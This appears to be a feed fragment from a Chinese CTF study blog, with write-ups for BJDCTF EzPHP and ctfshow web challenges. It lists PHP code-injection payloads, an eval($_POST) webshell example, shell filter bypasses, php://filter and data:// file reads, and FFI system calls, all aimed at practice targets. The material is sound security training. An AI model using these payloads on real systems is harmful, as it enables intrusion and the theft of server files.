    <content type="html"><![CDATA[<p>不会js，留个坑</p><p>访问run.php</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">if( array_key_exists( &quot;code&quot;, $_GET ) &amp;&amp; $_GET[ &#x27;code&#x27; ] != NULL ) &#123;</span><br><span class="line">    $code = $_GET[&#x27;code&#x27;];</span><br><span class="line">    echo eval(code);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>nodejs</p><p>大概就是利用现成的poc，然后由于有关键字，所以利用js的特性进行关键字绕过</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">prototype变成`$&#123;`$&#123;`prototyp`&#125;e`&#125;`</span><br><span class="line">$&#123;`$&#123;`prototyp`&#125;e`&#125;</span><br><span class="line">`p`,`r`,`o`,`t`,`o`,`t`,`y`,`p`,`e`</span><br></pre></td></tr></table></figure><p><a href="https://z3ratu1.github.io/%5BHFCTF2020%5DJustEscape.html">https://z3ratu1.github.io/%5BHFCTF2020%5DJustEscape.html</a></p><p><a href="https://blog.csdn.net/qq_43478096/article/details/109231567">https://blog.csdn.net/qq_43478096/article/details/109231567</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;不会js，留个坑&lt;/p&gt;
&lt;p&gt;访问run.php&lt;/p&gt;
&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt; &amp;lt;?php&lt;/span&gt;&lt;br</summary>
      
    
    
    
    
    <category term="坑" scheme="http://van0308.github.io/tags/%E5%9D%91/"/>
    
  </entry>
  
  <entry>
    <title>[BJDCTF]2020EzPHP</title>
    <link href="http://van0308.github.io/2023/04/buu_web/%E7%AC%AC%E5%9B%9B%E9%A1%B5/BJDCTF-2020EzPHP/"/>
    <id>http://van0308.github.io/2023/04/buu_web/%E7%AC%AC%E5%9B%9B%E9%A1%B5/BJDCTF-2020EzPHP/</id>
    <published>2023-04-22T14:51:57.000Z</published>
    <updated>2023-04-26T11:34:51.124Z</updated>
    
    <content type="html"><![CDATA[<p>F12</p><p>base32解码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1nD3x.php</span><br></pre></td></tr></table></figure><h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0); </span><br><span class="line"></span><br><span class="line">$file = &quot;1nD3x.php&quot;;</span><br><span class="line">$shana = $_GET[&#x27;shana&#x27;];</span><br><span class="line">$passwd = $_GET[&#x27;passwd&#x27;];</span><br><span class="line">$arg = &#x27;&#x27;;</span><br><span class="line">$code = &#x27;&#x27;;</span><br><span class="line"></span><br><span class="line">echo &quot;&lt;br /&gt;&lt;font color=red&gt;&lt;B&gt;This is a very simple challenge and if you solve it I will give you a flag. Good Luck!&lt;/B&gt;&lt;br&gt;&lt;/font&gt;&quot;;</span><br><span class="line"></span><br><span class="line">if($_SERVER) &#123; </span><br><span class="line">    if (</span><br><span class="line">        preg_match(&#x27;/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\&quot;|\&#x27;|log/i&#x27;, $_SERVER[&#x27;QUERY_STRING&#x27;])</span><br><span class="line">        )  </span><br><span class="line">        die(&#x27;You seem to want to do something bad?&#x27;); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (!preg_match(&#x27;/http|https/i&#x27;, $_GET[&#x27;file&#x27;])) &#123;</span><br><span class="line">    if (preg_match(&#x27;/^aqua_is_cute$/&#x27;, $_GET[&#x27;debu&#x27;]) &amp;&amp; $_GET[&#x27;debu&#x27;] !== &#x27;aqua_is_cute&#x27;) &#123; </span><br><span class="line">        $file = $_GET[&quot;file&quot;]; </span><br><span class="line">        echo &quot;Neeeeee! Good Job!&lt;br&gt;&quot;;</span><br><span class="line">    &#125; </span><br><span class="line">&#125; else die(&#x27;fxck you! What do you want to do ?!&#x27;);</span><br><span class="line"></span><br><span class="line">if($_REQUEST) &#123; </span><br><span class="line">    foreach($_REQUEST as $value) &#123; </span><br><span class="line">        if(preg_match(&#x27;/[a-zA-Z]/i&#x27;, $value))  </span><br><span class="line">            die(&#x27;fxck you! I hate English!&#x27;); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">if (file_get_contents($file) !== &#x27;debu_debu_aqua&#x27;)</span><br><span class="line">    die(&quot;Aqua is the cutest five-year-old child in the world! Isn&#x27;t it ?&lt;br&gt;&quot;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if ( sha1($shana) === sha1($passwd) &amp;&amp; $shana != $passwd )&#123;</span><br><span class="line">    extract($_GET[&quot;flag&quot;]);</span><br><span class="line">    echo &quot;Very good! you know my password. But what is flag?&lt;br&gt;&quot;;</span><br><span class="line">&#125; else&#123;</span><br><span class="line">    die(&quot;fxck you! you don&#x27;t know my password! And you don&#x27;t know sha1! why you come here!&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(preg_match(&#x27;/^[a-z0-9]*$/isD&#x27;, $code) || </span><br><span class="line">preg_match(&#x27;/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\&#123;|\%|x|\&amp;|\$|\*|\||\&lt;|\&quot;|\&#x27;|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i&#x27;, $arg) ) &#123; </span><br><span class="line">    die(&quot;&lt;br /&gt;Neeeeee~! I have disabled all dangerous functions! You can&#x27;t get my flag =w=&quot;); </span><br><span class="line">&#125; else &#123; </span><br><span class="line">    include &quot;flag.php&quot;;</span><br><span class="line">    $code(&#x27;&#x27;, $arg); </span><br><span class="line">&#125; ?&gt;</span><br><span class="line">This is a very simple challenge and if you solve it I will give you a flag. Good Luck!</span><br><span class="line">fxck you! I hate English!</span><br></pre></td></tr></table></figure><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><h4 id="SERVER-“QUERY-STRING”"><a href="#SERVER-“QUERY-STRING”" class="headerlink" title="$_SERVER[“QUERY_STRING”]"></a>$_SERVER[“QUERY_STRING”]</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://www.xxx.com/index.php?p=222&amp;q=u</span><br><span class="line">$_SERVER[&quot;QUERY_STRING&quot;] = “p=222&amp;q=u”</span><br><span class="line">不能有?shana=&amp;passwd=</span><br></pre></td></tr></table></figure><p>可以url编码绕过，因为<code>$_SERVER[‘QUERY_STRING’]</code>在读取url时并不会对url进行解码，而<code>$_GET[&#39;x&#39;]</code>是会进行url解码的，所以我们要把可能出现在黑名单的字符串进行url编码后再传入</p><h4 id="preg-match"><a href="#preg-match" class="headerlink" title="preg_match"></a>preg_match</h4><p>preg_match(‘&#x2F;^aqua_is_cute$&#x2F;‘, $_GET[‘debu’])要求debu的值满足正则&#x2F;^aqua_is_cute$&#x2F;，^和$用来表示开头和结尾<br>$_GET[‘debu’] !&#x3D;&#x3D; ‘aqua_is_cute’要求debu的值不能强等于’aqua_is_cute’</p><p>在末尾加%0a绕过匹配</p><h4 id="绕过-REQUEST的字母匹配"><a href="#绕过-REQUEST的字母匹配" class="headerlink" title="绕过$_REQUEST的字母匹配"></a>绕过$_REQUEST的字母匹配</h4><p><code>$_REQUEST</code>包括所有以post或者get方式传入的变量，如果含有字母则无法通过，但我们所有的参数构造都离不开字母。<br>这里的绕过方法主要利用<code>$_REQUEST</code>特性，变量post值会优先于get，我们只要在get传入变量后，再用post方式传入数字值进行覆盖即可</p><h4 id="file-get-contents"><a href="#file-get-contents" class="headerlink" title="file_get_contents"></a>file_get_contents</h4><p>这个data协议</p><h4 id="sha1强比较绕过"><a href="#sha1强比较绕过" class="headerlink" title="sha1强比较绕过"></a>sha1强比较绕过</h4><p>数组绕过，或者强碰撞</p><h4 id="create-function-注入"><a href="#create-function-注入" class="headerlink" title="create_function()注入"></a>create_function()注入</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$afunc = create_function(&#x27;$a, $b&#x27;,&#x27;return ($a+$b);&#x27;);</span><br><span class="line">echo $afunc(1,2);</span><br><span class="line">//输出3</span><br><span class="line">?&gt;</span><br><span class="line">等价于</span><br><span class="line">&lt;?php</span><br><span class="line">function afunc($a,$b)</span><br><span class="line">&#123;</span><br><span class="line">return $a+$b;</span><br><span class="line">&#125;</span><br><span class="line">echo afunc(1,2);</span><br><span class="line">//输出3</span><br><span class="line">?&gt;</span><br><span class="line">注入方式：</span><br><span class="line">$code参数可控，可能会存在代码注入</span><br><span class="line">&lt;?php</span><br><span class="line">$aFunc = create_function(&#x27;$a, $b&#x27;, &#x27;return($a+$b);&#125;eval($_POST[&#x27;cmd&#x27;]);//&#x27;);</span><br><span class="line"></span><br><span class="line">function aFunc($a, $b)</span><br><span class="line">&#123;</span><br><span class="line">return $a+$b;</span><br><span class="line">&#125;</span><br><span class="line">eval($_POST[&#x27;cmd&#x27;]);//&#125;</span><br><span class="line">?&gt;</span><br><span class="line">即$code=&#125;function;//</span><br><span class="line">&#125;闭合前面的，然后写语句，最后//来注释掉后面的内容。</span><br></pre></td></tr></table></figure><p>怎么实际操作呢（坑）</p><p>extract函数是一个关联数组。此函数会将键名当作变量名，值作为变量的值</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">extract($_GET[&quot;flag&quot;]);</span><br><span class="line">那我们构造</span><br><span class="line">flag[&#x27;code&#x27;]=&amp;flag[&#x27;arg&#x27;]=</span><br><span class="line">即可将code键名作为变量名，然后值作为变量的值。（个人的分析）</span><br></pre></td></tr></table></figure><h4 id="arg的选择"><a href="#arg的选择" class="headerlink" title="arg的选择"></a>arg的选择</h4><p>由于过滤很严格，黑名单，那么可以试试找替代的函数  <code>get_defined_vars()</code>直接输出所有变量</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">include &quot;flag.php&quot;;，包含了flag.php文件，代表可以使用里面的变量。所以要想办法在不指定变量名称的情况下输出变量的值，可以想到：是否存在一个函数，能输出所有变量的值？刚好get_defined_vars()用来输出所有变量和值。</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后得到了假的flag，真正的flag在rea1fl4g.php</p><p>再看过滤的</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">过滤了include 还能用require</span><br><span class="line">过滤了引号，可以使用那些参数可以不加引号的函数，require()代替require &quot; &quot;</span><br><span class="line">过滤了flag，可以base64编码</span><br><span class="line"></span><br><span class="line">即利用require(php://filter/read=convert.base64-encode/resource=rea1fl4g.php)</span><br><span class="line">但filter被过滤了。用~绕过正则</span><br><span class="line">&lt;?php</span><br><span class="line">echo urlencode(~&#x27;php://filter/read=convert.base64-encode/resource=rea1fl4g.php&#x27;);</span><br><span class="line">得到</span><br><span class="line">%8F%97%8F%C5%D0%D0%99%96%93%8B%9A%8D%D0%8D%9A%9E%9B%C2%9C%90%91%89%9A%8D%8B%D1%9D%9E%8C%9A%C9%CB%D2%9A%91%9C%90%9B%9A%D0%8D%9A%8C%90%8A%8D%9C%9A%C2%8D%9A%9E%CE%99%93%CB%98%D1%8F%97%8F</span><br><span class="line">最终</span><br><span class="line">require(~(%8F%97%8F%C5%D0%D0%99%96%93%8B%9A%8D%D0%8D%9A%9E%9B%C2%9C%90%91%89%9A%8D%8B%D1%9D%9E%8C%9A%C9%CB%D2%9A%91%9C%90%9B%9A%D0%8D%9A%8C%90%8A%8D%9C%9A%C2%8D%9A%9E%CE%99%93%CB%98%D1%8F%97%8F))</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file=data://text/plain,debu_debu_aqua&amp;debu=aqua_is_cute%oa&amp;shana[]=1&amp;passwd[]=2</span><br><span class="line">%66%69%6c%65=%64%61%74%61%3a%2f%2f%74%65%78%74%2f%70%6c%61%69%6e%2c%64%65%62%75%5f%64%65%62%75%5f%61%71%75%61&amp;%64%65%62%75=%61%71%75%61%5f%69%73%5f%63%75%74%65%0a&amp;%73%68%61%6e%61[]=1&amp;%70%61%73%73%77%64[]=2</span><br><span class="line"></span><br><span class="line">注意%0a、[]、&amp;、=不用url编码，</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">后续的</span><br><span class="line">$code=create_function&amp;arg=&#125;var_dump(get_defined_vars());//</span><br><span class="line">fl%61g[c%6fde]=create_function&amp;fl%61g[%61rg]=&#125;var_dump(get_defined_vars());//</span><br><span class="line">以下</span><br><span class="line">file=data://text/plain,debu_debu_aqua&amp;debu=aqua_is_cute%oa&amp;shana[]=1&amp;passwd[]=2</span><br><span class="line">%66%69%6c%65=%64%61%74%61%3a%2f%2f%74%65%78%74%2f%70%6c%61%69%6e%2c%64%65%62%75%5f%64%65%62%75%5f%61%71%75%61&amp;%64%65%62%75=%61%71%75%61%5f%69%73%5f%63%75%74%65%0a&amp;%73%68%61%6e%61[]=1&amp;%70%61%73%73%77%64[]=2&amp;fl%61g[c%6fde]=create_function&amp;fl%61g[%61rg]=&#125;var_dump(get_defined_vars());//</span><br><span class="line">同时post debu=1&amp;file=1</span><br><span class="line">以下</span><br><span class="line">get:</span><br><span class="line">?%64%65%62%75=%61%71%75%61%5f%69%73%5f%63%75%74%65%0a&amp;%66%69%6c%65=%64%61%74%61%3a%2c%64%65%62%75%5f%64%65%62%75%5f%61%71%75%61&amp;%73%68%61%6e%61[]=1&amp;%70%61%73%73%77%64[]=2&amp;%66%6c%61%67%5b%61%72%67%5d=&#125;require(~(%8f%97%8f%c5%d0%d0%99%96%93%8b%9a%8d%d0%8d%9a%9e%9b%c2%9c%90%91%89%9a%8d%8b%d1%9d%9e%8c%9a%c9%cb%d2%9a%91%9c%90%9b%9a%d0%8d%9a%8c%90%8a%8d%9c%9a%c2%8d%9a%9e%ce%99%93%cb%98%d1%8f%97%8f));//&amp;%66%6c%61%67%5b%63%6f%64%65%5d=%63%72%65%61%74%65%5f%66%75%6e%63%74%69%6f%6e</span><br><span class="line">没urlencode前:</span><br><span class="line">debu=aqua_is_cute%0a&amp;file=data:,debu_debu_aqua&amp;shana[]=1&amp;passwd[]=2&amp;flag[arg%5d=&#125;require(~(%8f%97%8f%c5%d0%d0%99%96%93%8b%9a%8d%d0%8d%9a%9e%9b%c2%9c%90%91%89%9a%8d%8b%d1%9d%9e%8c%9a%c9%cb%d2%9a%91%9c%90%9b%9a%d0%8d%9a%8c%90%8a%8d%9c%9a%c2%8d%9a%9e%ce%99%93%cb%98%d1%8f%97%8f));//&amp;flag[code]=create_functio%6e</span><br><span class="line"></span><br><span class="line">post:</span><br><span class="line">debu=&amp;file=</span><br></pre></td></tr></table></figure><p>tips：</p><p>注意%0a、[]、&amp;、&#x3D;不用url编码，</p><p>可以写未url的payload，然后再在burp里面url一下，就会清楚方便一点。</p><p>burp发的会没回显，还是得hackbar，因为会url一层吧</p><p><a href="https://blog.csdn.net/weixin_51804748/article/details/121330064">https://blog.csdn.net/weixin_51804748/article/details/121330064</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;F12&lt;/p&gt;
&lt;p&gt;base32解码&lt;/p&gt;
&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1nD3x.php&lt;/span&gt;&lt;br&gt;&lt;/pre</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>[网鼎杯 2020 半决赛]AliceWebsite</title>
    <link href="http://van0308.github.io/2023/04/buu_web/%E7%AC%AC%E4%B8%89%E9%A1%B5/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E5%8D%8A%E5%86%B3%E8%B5%9B-AliceWebsite/"/>
    <id>http://van0308.github.io/2023/04/buu_web/%E7%AC%AC%E4%B8%89%E9%A1%B5/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E5%8D%8A%E5%86%B3%E8%B5%9B-AliceWebsite/</id>
    <published>2023-04-22T14:39:34.000Z</published>
    <updated>2023-04-26T15:41:38.420Z</updated>
    
    <content type="html"><![CDATA[<p>文件包含</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">include</span><br><span class="line">data协议不行</span><br><span class="line">input也不行</span><br><span class="line">无语，直接遍历包含。</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;文件包含&lt;/p&gt;
&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;include&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;dat</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>ctfshowweb1000</title>
    <link href="http://van0308.github.io/2023/04/ctfshow/web/ctfshowweb1000/"/>
    <id>http://van0308.github.io/2023/04/ctfshow/web/ctfshowweb1000/</id>
    <published>2023-04-06T08:26:23.000Z</published>
    <updated>2023-04-26T12:29:37.650Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://www.wlhhlc.top/posts/14827/">https://www.wlhhlc.top/posts/14827/</a></p><p>命令执行：</p><p>41 55 56</p><p>脚本没学why，做完了命令执行。差收集姿势与理解脚本，原理（后面几道大题）</p><p><a href="https://blog.csdn.net/qq_49480008/article/details/113177878">https://blog.csdn.net/qq_49480008/article/details/113177878</a></p><p><a href="https://ch1e.gitee.io/2021/07/23/ctfshowweb/">https://ch1e.gitee.io/2021/07/23/ctfshowweb/</a></p><p>?c&#x3D;system(‘cat f?ag.php’);</p><p>?c&#x3D;echo <code>cat f???.???</code>;</p><p>?c&#x3D;echo%0a<code>tac%09f???*</code>;  第二个%0a不行</p><p>32</p><p>?c&#x3D;include”$_GET[v]”?&gt;&amp;v&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php  还可以用日志？？</p><p>33</p><p>?c&#x3D;include$_GET[v]?&gt;&amp;v&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</p><p>?c&#x3D;include%0a$_GET[v]?&gt;&amp;v&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</p><p>?c&#x3D;include$_GET[v]?&gt;&amp;v&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</p><p>37</p><p>有意思的是，</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php system(&quot;cat index.php&quot;)?&gt; 可以（F12得到源码）</span><br><span class="line">&lt;?php system(&quot;cat flag.php&quot;)?&gt;不可以</span><br><span class="line">&lt;?php system(&quot;cat flag.php&quot;);?&gt;可以</span><br></pre></td></tr></table></figure><p>？c&#x3D;data:&#x2F;&#x2F;text&#x2F;plain&#x2F;;base64,PD9waHAgc3lzdGVtKCJjYXQgZmxhZy5waHAiKTs&#x2F;Pg&#x3D;&#x3D;</p><p>?c&#x3D;data:&#x2F;&#x2F;text&#x2F;plain&#x2F;,<?php system('cat fla*.php');?></p><p>40</p><p>可以用echo 空格 字母 ;下划线 英文括号</p><p>?c&#x3D;echo system(ls); 可以执行，但是接下来不知道怎么办 （坑）</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">    localeconv()：返回一包含本地数字及货币格式信息的数组。其中数组中的第一个为点号(.)</span><br><span class="line">    pos()：返回数组中的当前元素的值。</span><br><span class="line">    array_reverse()：数组逆序 scandir()：获取目录下的文件</span><br><span class="line">    next()：函数将内部指针指向数组中的下一个元素，并输出。 首先通过</span><br><span class="line">    pos(localeconv())得到点号，因为scandir(’.’)表示得到当前目录下的文件，所以scandir(pos(localeconv()))就能得到flag.php了。</span><br><span class="line"></span><br><span class="line">print_r(file_get_contents(next(array_reverse(scandir(pos(localeconv()))))));</span><br></pre></td></tr></table></figure><p>42</p><p>?c&#x3D;cat flag.php;</p><p>43</p><p>?c&#x3D;tac flag.php||</p><p>44</p><p>?c&#x3D;tac fla?.php||</p><p>45</p><p>?c&#x3D;tac%09fla?.php||</p><p>46</p><p>?c&#x3D;tac&lt;.&#x2F;fla\g.php||</p><p>?c&#x3D;tac${IFS}.&#x2F;fla\g.php||不行是怎么回事</p><p>47</p><p>?c&#x3D;tac&lt;.&#x2F;fla\g.php||</p><p>48</p><p>?c&#x3D;tac&lt;.&#x2F;fla\g.php||</p><p>49</p><p>?c&#x3D;vi&lt;.&#x2F;fla\g.php||</p><p>52</p><p>?c&#x3D;ca\t${IFS}fla\g.php||</p><p>?c&#x3D;ca\t${IFS}&#x2F;fla\g||</p><p>53</p><p>?c&#x3D;ca\t${IFS}fla\g.php</p><p>54</p><p>?c&#x3D;vi${IFS}fl?g.php</p><p>55</p><p>[a-z] 没过滤数字</p><p>?c&#x3D;&#x2F;???&#x2F;????64 ????????</p><p>56</p><p>无数字字母</p><p>57</p><p>wp说提示有说是flag在36.php</p><p>58-65</p><p>system尝试后，说被禁用，可以试试内置函数。</p><p>c&#x3D;highlight_file(next(array_reverse(scandir(pos(localeconv())))));</p><p>66</p><p>print_r(scandir(‘&#x2F;‘));</p><p>c&#x3D;highlight_file(‘&#x2F;flag.txt’);</p><p>67</p><p>c&#x3D;var_dump(scandir(‘.’));</p><p>68</p><p>c&#x3D;var_dump(scandir(‘&#x2F;‘));</p><p>c&#x3D;include(‘&#x2F;flag.txt’);</p><p>69</p><p>71</p><p>c&#x3D;var_export(scandir(‘&#x2F;‘));exit();</p><p>c&#x3D;include(‘&#x2F;flag.txt’);exit();</p><p>72</p><p>c&#x3D;$a&#x3D;new DirectoryIterator(‘glob:&#x2F;&#x2F;&#x2F;*’);foreach($a as $f){echo($f-&gt;__toString().” “);}exit;</p><p>用群主给的</p><p>73 74</p><p>c&#x3D;var_export(scandir(‘&#x2F;‘));exit();</p><p>c&#x3D;include(‘&#x2F;flagc.txt’);exit();</p><p>或者</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=?&gt;&lt;?php    //前面的?&gt;用来闭合&lt;?</span><br><span class="line">$a=new DirectoryIterator(&quot;glob:///*&quot;);   //php使用glob遍历文件夹</span><br><span class="line">foreach($a as $f) </span><br><span class="line">&#123;</span><br><span class="line">echo($f-&gt;__toString().&#x27; &#x27;);</span><br><span class="line">&#125; </span><br><span class="line">exit(0);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">直接复制hackbar不行</span><br><span class="line">转成</span><br><span class="line">c=?&gt;&lt;?php $a=new DirectoryIterator(&quot;glob:///*&quot;);foreach($a as $f)&#123;echo($f-&gt;__toString().&#x27; &#x27;);&#125;exit(0);?&gt;  OK</span><br></pre></td></tr></table></figure><p>75</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=?&gt;&lt;?php $a=new DirectoryIterator(&quot;glob:///*&quot;);foreach($a as $f)&#123;echo($f-&gt;__toString().&#x27; &#x27;);&#125;exit(0);?&gt;</span><br><span class="line"></span><br><span class="line">c=try &#123;$dbh = new PDO(&#x27;mysql:host=localhost;dbname=ctftraining&#x27;, &#x27;root&#x27;,</span><br><span class="line">&#x27;root&#x27;);foreach($dbh-&gt;query(&#x27;select load_file(&quot;/flag36.txt&quot;)&#x27;) as $row)</span><br><span class="line">&#123;echo($row[0]).&quot;|&quot;; &#125;$dbh = null;&#125;catch (PDOException $e) &#123;echo $e-</span><br><span class="line">&gt;getMessage();exit(0);&#125;exit(0);</span><br><span class="line"></span><br><span class="line">上面直接复制也是不行，删除空格后就可以了</span><br><span class="line">c=try &#123;$dbh = new PDO(&#x27;mysql:host=localhost;dbname=ctftraining&#x27;, &#x27;root&#x27;,&#x27;root&#x27;);foreach($dbh-&gt;query(&#x27;select load_file(&quot;/flag36.txt&quot;)&#x27;) as $row)&#123;echo($row[0]).&quot;|&quot;; &#125;$dbh = null;&#125;catch (PDOException $e) &#123;echo $e-&gt;getMessage();exit(0);&#125;exit(0);</span><br></pre></td></tr></table></figure><p>76</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">c=<span class="variable">$ffi</span>=FFI :: <span class="title function_ invoke__">cdef</span>(<span class="string">&quot;int system(const char *command);&quot;</span>);<span class="variable">$a</span>=<span class="string">&#x27;/readflag &gt; 1.txt&#x27;</span>;<span class="variable">$ffi</span>-&gt;<span class="title function_ invoke__">system</span>(<span class="variable">$a</span>);<span class="keyword">exit</span>();</span><br><span class="line">会报错，但是访问<span class="number">1</span>.txt还是会得到</span><br><span class="line">直接读取flag36x.txt读取不出来，所以用readflag</span><br></pre></td></tr></table></figure><p>77</p><p>过滤小写字母数字，() &#96; &gt;  &lt; % &#x2F; |</p><p>可以用的$ {} ; _ ?. ~ 大写字母</p><p>code&#x3D;${PATH:<del>A}${PWD:</del>A} ????.???;</p><p>78</p><p>多过滤了PATH</p><p>118</p><p>code&#x3D;${PATH:<del>A}${PWD:</del>A} ????.???</p><p>119</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$&#123;PWD:$&#123;#&#125;:$&#123;#SHLVL&#125;&#125;???$&#123;PWD:$&#123;#&#125;:$&#123;#SHLVL&#125;&#125;?$&#123;USER:~$&#123;PHP_VERSION:~A&#125;:$&#123;PHP_VERSION:~A&#125;&#125; ????.???</span><br><span class="line">#/bin/cat flag.php </span><br><span class="line">$&#123;USER:~2:2&#125;-&gt;at  www-data</span><br><span class="line">PHP_VERSION:7.3.22</span><br><span class="line">或者</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>120</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$&#123;PWD:$&#123;#&#125;:$&#123;#SHLVL&#125;&#125;???$&#123;PWD:$&#123;#&#125;:$&#123;#SHLVL&#125;&#125;?$&#123;USER:~A&#125;? ????.???</span><br><span class="line">但发现长度是66还是超了，接着我们把$&#123;#&#125;去掉，也是可以的，最终payload如下：</span><br><span class="line">code=$&#123;PWD::$&#123;#SHLVL&#125;&#125;???$&#123;PWD::$&#123;#SHLVL&#125;&#125;?$&#123;USER:~A&#125;? ????.???</span><br><span class="line">#/bin/cat flag.php</span><br></pre></td></tr></table></figure><p>121</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">code=$&#123;PWD::$&#123;#?&#125;&#125;???$&#123;PWD::$&#123;#?&#125;&#125;?????$&#123;#RANDOM&#125; ????.???</span><br><span class="line">#/bin/base64 flag.php</span><br><span class="line">code=$&#123;PWD::$&#123;##&#125;&#125;???$&#123;PWD::$&#123;##&#125;&#125;$&#123;PWD:$&#123;#IFS&#125;:$&#123;##&#125;&#125;?? ????.???</span><br><span class="line">#/bin/rev flag.php</span><br></pre></td></tr></table></figure><p>122</p><p>较之放了&lt; HOME  不过这个 上一题的% 和 %不知道过滤什么东西</p><p>禁了#</p><p>123</p><p>code&#x3D;&lt;A;${HOME::$?}???${HOME::$?}?????${RANDOM::$?} ????.???</p><p>124</p><p><a href="https://blog.csdn.net/qq_44657899/article/details/106104340">https://blog.csdn.net/qq_44657899/article/details/106104340</a></p><p>搜刮：wp</p><p><a href="https://ch1e.gitee.io/2021/07/23/ctfshowweb/">https://ch1e.gitee.io/2021/07/23/ctfshowweb/</a></p><p><a href="https://xz.aliyun.com/t/8354#toc-5">https://xz.aliyun.com/t/8354#toc-5</a></p><p><a href="https://blog.csdn.net/tomyyyyyy/article/details/115403458">https://blog.csdn.net/tomyyyyyy/article/details/115403458</a></p><p><a href="https://blog.csdn.net/weixin_44700621/article/details/125381763">https://blog.csdn.net/weixin_44700621/article/details/125381763</a></p><p><a href="https://www.freebuf.com/articles/network/279563.html">https://www.freebuf.com/articles/network/279563.html</a></p><p><a href="https://blog.csdn.net/miuzzx/article/details/109143413">https://blog.csdn.net/miuzzx/article/details/109143413</a></p><p>[<a href="https://blog.csdn.net/solitudi/article/details/109837640">CTFSHOW]命令执行_ctfshow命令执行_Y4tacker的博客-CSDN博客</a></p><p>文件包含：</p><p><a href="https://blog.csdn.net/qq_49480008/article/details/113696392">https://blog.csdn.net/qq_49480008/article/details/113696392</a></p><p><a href="https://blog.csdn.net/miuzzx/article/details/116205407">https://blog.csdn.net/miuzzx/article/details/116205407</a></p><p><a href="https://xz.aliyun.com/t/5535">https://xz.aliyun.com/t/5535</a></p><p><a href="https://www.cnblogs.com/Zeker62/p/15322771.html">https://www.cnblogs.com/Zeker62/p/15322771.html</a></p><p>78</p><p>?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</p><p>79</p><p>?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain&#x2F;;base64,PD9waHAgc3lzdGVtKCJjYXQgZmxhZy5waHAiKT8%2b</p><p>80</p><p>PHP特性：</p><p>web90 4476a 4476.1</p><p>web92 93</p><p>4476.1</p><p>94 4476.0</p><p>96开始</p>]]></content>
    
    
      
      
